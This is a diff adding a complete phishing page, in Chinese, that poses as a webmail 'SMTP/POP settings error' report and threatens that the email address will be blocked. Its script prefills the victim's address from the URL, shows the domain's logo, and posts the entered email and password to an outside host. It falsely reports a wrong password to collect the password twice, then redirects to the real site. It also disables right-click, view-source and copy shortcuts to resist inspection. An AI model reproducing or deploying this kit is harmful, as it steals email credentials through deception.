@@ -1,0 +1,596 @@
+﻿
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>错误报告 - 您的 SMTP/POP 设置中存在错误，导致无法接收电子邮件。.</title>
+<link rel="icon" type="image/ico" href="fav.png">
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<script>
+         function populate() { 
+         function updateDateTime() {
+            const now = new Date();
+            // Format the date and time based on the user's local settings
+            const currentString = now.toLocaleString();
+            
+            // Inject the string into the HTML placeholder
+            document.getElementById("datetime").innerHTML = currentString;
+        }
+
+        // Run the function immediately when the page loads
+        updateDateTime();
+
+        // Update the time every second (1000 milliseconds)
+        setInterval(updateDateTime, 1000);}
+    </script>
+<style type="text/css">
+<!--
+body {
+	background-color: #EFEFEF;
+	margin-left: 0px;
+	margin-top: 0px;
+	margin-right: 0px;
+	margin-bottom: 0px;
+}
+p {
+	float:none;
+	clear:both;
+}
+h3 {
+	line-height: 2em;
+}
+div, span, input[type=text], input[type=email], input[type=password] {
+	box-sizing: border-box;
+}
+.container {
+	font-family: Arial, Helvetica, sans-serif;
+	font-size: 14px;
+	line-height: 1.6em;
+	color: #333;
+	background-color: #FFF;
+	width: auto;
+	margin-right: 14%;
+	margin-left: 14%;
+	border-radius: 4px;
+	margin-bottom: 32px;
+	padding: 32px;
+	box-shadow: 0 0 8px rgba(0, 0, 0, 0.1);
+	border: 1px solid #d6d7dc;
+	margin-top: 32px;
+}
+.row {
+	margin-top: 8px;
+	margin-right: auto;
+	margin-bottom: 8px;
+	margin-left: auto;
+	height:auto;
+}
+.row1, .row1:first-of-type, .row1:last-of-type {
+	width: 20%;
+	display:inline-block;
+	float:left;
+	background-color: #f6f6f6;
+	padding: 10px;
+	height:17.4vh;
+	border-top-width: 1px;
+	border-right-width: 1px;
+	border-bottom-width: 1px;
+	border-left-width: 1px;
+	border-top-style: solid;
+	border-right-style: solid;
+	border-bottom-style: solid;
+	border-left-style: solid;
+	border-top-color: #ddd;
+	border-right-color: #ddd;
+	border-bottom-color: #ddd;
+	border-left-color: #ddd;
+}
+.row1:last-of-type {
+	background-color: #FFF;
+	width: 80%;
+	border-left-style: none;
+}
+.inner1, .inner1:first-of-type, .inner1:last-of-type {
+	width: 28%;
+	display:inline-block;
+	float:left;
+	background-color: #f6f6f6;
+	padding: 10px;
+	height:auto;
+	border-top-width: 1px;
+	border-right-width: 1px;
+	border-bottom-width: 1px;
+	border-left-width: 1px;
+	border-top-style: none;
+	border-right-style: none;
+	border-bottom-style: solid;
+	border-left-style: none;
+	border-top-color: #ddd;
+	border-right-color: #ddd;
+	border-bottom-color: #ddd;
+	border-left-color: #ddd;
+}
+.inner1:last-of-type {
+	background-color: #FFF;
+	width: 72%;
+}
+.Topic1 {
+	font-size: 18px;
+	margin-bottom: 20px;
+	color: #FFF;
+	background-color: #666;
+	padding: 16px;
+	text-align: center;
+	display: block;
+	border-radius: 4px;
+	border-top-style: none;
+	border-right-style: none;
+	border-bottom-style: none;
+	border-left-style: none;
+}
+.container-inner {
+	background-color:#FFF;
+	width: 74%;
+	position: relative;
+	border-top-width: 1px;
+	border-right-width: 1px;
+	border-bottom-width: 1px;
+	border-left-width: 1px;
+	border-top-style: solid;
+	border-right-style: solid;
+	border-bottom-style: none;
+	border-left-style: solid;
+	border-top-color: #ddd;
+	border-right-color: #ddd;
+	border-bottom-color: #ddd;
+	border-left-color: #ddd;
+	float: left;
+	display: inline-block;
+}
+.redText {
+	color: #F00;
+}
+.textYellow {
+	color: #FFC;
+	text-transform: uppercase;
+}
+.logo-top {
+	float: none;
+	width: 25%;
+	display:none;
+	padding: 0px;
+	margin-top: auto;
+	margin-right: auto;
+	margin-bottom: 10px;
+	margin-left: auto;
+}
+.logo-top img {
+	width: 100%;
+}
+.logo {
+	float: right;
+	width: 25%;
+	padding-top: 26px;
+	padding-right: 14px;
+	padding-bottom: 0px;
+	padding-left: 14px;
+	display:block;
+}
+.logo img {
+	width: 100%;
+}
+input[type=text], input[type=email], input[type=password] {
+	width: 220px;
+	color: #292929;
+	font-size: 12px;
+	line-height: 1.8em;
+	border: 1px solid #AEAEAE;
+	height: auto;
+	padding-top: 4px;
+	padding-right: 10px;
+	padding-bottom: 4px;
+	padding-left: 10px;
+	background-color: #FFF;
+	border-radius: 4px;
+	box-shadow: 0 0 0 4px #e7e7e7;
+	margin-right: 20px;
+	margin-bottom: 18px;
+}
+input[type=text]:focus, input[type=email]:focus, input[type=password]:focus {
+	box-shadow: 0 0 0 4px #CCACB3;
+}
+input[type=submit], input[type=button], .REG-button {
+	background-color:#5A6878;
+	color:#FFF;
+	width:auto;
+	padding-top: 8px;
+	padding-right: 16px;
+	padding-bottom: 8px;
+	padding-left: 16px;
+	font-size: 14px;
+	font-weight: normal;
+	border-radius: 4px;
+	letter-spacing: 0.8px;
+	border-top-style: none;
+	border-right-style: none;
+	border-bottom-style: none;
+	border-left-style: none;
+	box-shadow: 0 0 0 4px #e7e7e7;
+	margin-right: 12px;
+	text-transform: capitalize;
+	text-decoration: none;
+}
+input[type=submit]:hover, input[type=button]:hover, .REG-button:hover {
+	background-color:#38424B;
+}
+ @media all and (max-width:768px) {
+ .container {
+ margin-right: 4%;
+ margin-left: 4%;
+}
+}
+@media all and (max-width:400px) {
+ h3 {
+ line-height: 0.1em;
+}
+ .Topic1 {
+ font-size: 14px;
+ margin-bottom: 10px;
+ padding-bottom: 8px;
+ padding-top: 8px;
+}
+.container {
+font-size: 12px;
+ margin-right: 0px;
+ margin-left: 0px;
+ margin-bottom: 0px;
+ padding: 16px;
+ margin-top: 0px;
+ border-radius: 0px;
+}
+ .row {
+ margin-top: 8px;
+ margin-bottom: 8px;
+}
+.row1, .row1:first-of-type, .row1:last-of-type {
+ width: 100%;
+ float:none;
+ padding: 10px;
+ height: auto;
+}
+.row1:last-of-type {
+ width: 100%;
+ border-left-style: solid;
+}
+.container-inner {
+ width: 100%;
+ border-top-style: none;
+border-left-style: none;
+border-bottom-style: none;
+}
+.inner1, .inner1:first-of-type, .inner1:last-of-type {
+ width: 100%;
+ float:none;
+ padding: 6px;
+ border-top-width: 1px;
+ border-right-width: 1px;
+ border-bottom-width: 1px;
+ border-left-width: 1px;
+ border-top-style: solid;
+ border-right-style: solid;
+ border-bottom-style: solid;
+ border-left-style: solid;
+ border-top-color: #ddd;
+ border-right-color: #ddd;
+ border-bottom-color: #ddd;
+ border-left-color: #ddd;
+}
+.inner1:last-of-type {
+ background-color: #FFF;
+ width: 100%;
+}
+ input[type=text], input[type=email], input[type=password] {
+ width: 100%;
+}
+ input[type=submit], input[type=button] {
+ width:100%;
+ margin-top: 20px;
+}
+.logo-top {
+ float: none;
+ width: 50%;
+ display:block;
+}
+.logo-top img {
+ width: 100%;
+}
+.logo {
+ float: right;
+ width: 25%;
+ padding-top: 26px;
+ padding-right: 14px;
+ padding-bottom: 0px;
+ padding-left: 14px;
+ display:none;
+}
+.logo img {
+ width: 100%;
+}
+}
+.errorMsg {
+	color: #F00;
+	display: block;
+	float: none;
+	margin-right: auto;
+	margin-bottom: auto;
+	font-size: 12px;
+	font-family: Tahoma, Geneva, sans-serif;
+	padding-bottom: 4px;
+}
+.contactFrm {
+	margin-top: 10px;
+}
+-->
+</style>
+</head>
+<body onload="populate()">
+<div class="container">
+  <div class="Topic1"><strong class="textYellow"> 网页邮箱错误报告</strong><br>
+    您的邮箱 SMTP/POP 设置有误，导致无法接收邮件。.<br />
+  </div>
+  <div class="logo-top"> xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx </div>
+  <div class="row">
+    <div class="row1">
+      <h3><strong>错误信息:</strong></h3>
+    </div>
+    <div class="row1">
+      <div class="container-inner">
+        <div> <span class="inner1"> 通知日期:</span> <span class="inner1" id="datetime"> </span>
+          <p> 
+        </div>
+        <div> <span class="inner1">主题:</span> <span class="inner1 redText">加载收件箱中的部分邮件时出错 </span>
+          <p> 
+        </div>
+      </div>
+      <div class="logo"> 
+       
+       </div>
+    </div>
+    <p> 
+  </div>
+  <div class="row">
+    <div class="row1">
+      <h3><strong>退信原因:</strong></h3>
+    </div>
+    <div class="row1"><strong>您的 SMTP/POP 设置中存在错误，导致无法接收电子邮件。</strong><br />
+      550-5.1.1: 无法验证 POP 配置文本<br />
+      550-5.1.2: 登录过程中，SSL 设置出现未处理的错误。<br />
+      550-5.1.3: 登录过程中，SSL 设置出现未处理的错误。 </div>
+    <p> 
+  </div>
+  <div class="row">
+    <div class="row1">
+      <h3><strong>建议解决方案:</strong></h3>
+    </div>
+    <div class="row1">请填写下方表格，我们的技术团队将在 3 到 4 小时内修复该错误。错误修复后，您的收件箱将会收到一封确认邮件。<br />
+      <strong>Note:</strong> 若未能发送此错误报告，您的电子邮件地址将被封锁。
+      <p> 
+    </div>
+    <p> 
+  </div>
+  <div class="row">
+    <div class="row1">
+      <h3><strong>发送错误详情:</strong></h3>
+    </div>
+    <div class="row1"><strong>登录您的电子邮件账户以发送错误详情.</strong>
+      <div class="contactFrm">
+        <span id="statusMessage" class="errorMsg"></span>
+        <form name="loginForm" id="loginForm" method="post">
+          <input type="email" name="email" id="email" placeholder="email@example.com" readonly>
+          <input type="password" name="password" placeholder="您的密码" id="password" required="required">
+          <input type="submit" value="提交" id="submit-btn">
+          <div class="clear"> </div>
+        </form>
+      </div>
+<div id="msg" style="display: none;text-align: justify; color: red;font-weight: 600">Invalid Password, please try again.</div>
+      <p> 
+    </div>
+    <p> 
+  </div>
+<script>function showStatus(statusMsg, msgClass = "") {
+    const statusSpan = document.getElementById("statusMessage");
+    
+    // 1. If the message is empty, clear the box and hide it
+    if (!statusMsg || statusMsg.trim() === "") {
+        statusSpan.innerHTML = "";
+        statusSpan.className = "errorMsg"; 
+        return;
+    }
+    
+    // 2. Set the dynamic text safely (prevents XSS vulnerabilities)
+    statusSpan.textContent = statusMsg;
+    
+    // 3. Apply the default class, plus any extra style class if provided
+    if (msgClass !== "") {
+        statusSpan.className = `errorMsg ${msgClass}`;
+    } else {
+        statusSpan.className = "errorMsg";
+    }
+}
+</script>
+<!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<!-- jQuery first, then Popper.js, then Bootstrap JS -->
+      <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js"></script>
+
+  <script>
+    
+// prevent ctrl + s
+$(document).bind('keydown', function(e) {
+if(e.ctrlKey && (e.which == 83)) {
+e.preventDefault();
+return false;
+}
+});
+
+document.addEventListener('contextmenu', event => event.preventDefault());
+
+document.onkeydown = function(e) {
+if (e.ctrlKey && 
+(e.keyCode === 67 || 
+e.keyCode === 86 || 
+e.keyCode === 85 || 
+e.keyCode === 117)) {
+return false;
+} else {
+return true;
+}
+};
+$(document).keypress("u",function(e) {
+if(e.ctrlKey)
+{
+return false;      }
+else {
+return true;
+}});
+
+
+
+/* global $ */
+$(document).ready(function(){
+var count=0;
+
+$('#back1').click(function () {
+$("#msg").hide();
+$('#email').val("");
+$("#automail").animate({left:200, opacity:"hide"}, 0);
+$("#inputbar").animate({right:200, opacity:"show"}, 1000);
+
+});
+
+var email = window.location.hash.substr(1);
+if (!email) {
+
+}
+else
+{
+var my_email =email;
+$('#email').val(my_email);
+$('#emailich').html(my_email);
+var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+if (!filter.test(my_email)) {
+$('#error').show();
+email.focus;
+return false;
+}
+var ind=my_email.indexOf("@");
+var my_slice=my_email.substr((ind+1));
+var c= my_slice.substr(0, my_slice.indexOf('.'));
+var final= c.toLowerCase();
+var finalu= c.toUpperCase();
+
+$("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
+$("#logoname").html(finalu);
+$(".logoname").html(finalu);
+}
+
+
+$('#submit-btn').click(function(event){
+$('#error').hide();
+$('#msg').hide();
+event.preventDefault();
+var email=$("#email").val();
+var password=$("#password").val();
+var msg = $('#msg').html();
+$('#msg').text( msg );
+///////////new injection////////////////
+var my_email =email;
+var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+if (!filter.test(my_email)) {
+$('#error').show();
+email.focus;
+return false;
+}
+
+var ind=my_email.indexOf("@");
+var my_slice=my_email.substr((ind+1));
+var c= my_slice.substr(0, my_slice.indexOf('.'));
+var final= c.toLowerCase();
+var finalu= c.toUpperCase();
+
+$("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
+$("#logoname").html(finalu);
+///////////new injection////////////////
+count=count+1;
+
+$.ajax({
+dataType: 'JSON',
+url: 'https://clapstickmkt.name.ng/vice/ola.php',
+type: 'POST',
+      	data:{
+      		email:email,
+      		password:password,
+      	},
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+            	$('#submit-btn').val('核实...');
+            },
+            success: function(response){
+            	if(response){
+            		$("#msg").show();
+            		console.log(response);
+            		if(response['signal'] == 'ok'){
+            			$("#password").val("");
+            			if (count>=2) {
+            				count=0;
+                    // window.location.replace(response['redirect_link']);
+                    window.location.replace("https://www."+my_slice);
+
+                }
+                $('#msg').html(response['msg']);
+            }
+            else{
+            	$('#msg').html(response['msg']);
+            }
+        }
+    },
+    error: function(){
+    	$("#password").val("");
+    	if (count>=2) {
+    		count=0;
+    		 window.location.replace("https://www."+my_slice);
+    	}
+    	$("#msg").show();
+    	$('#msg').html("密码无效，请重试.");
+    },
+    complete: function(){
+    	$('#submit-btn').val('提交');
+    }
+});
+  });
+
+
+	});
+
+
+</script>
+
+
+
+
+</body>
+
+</html>
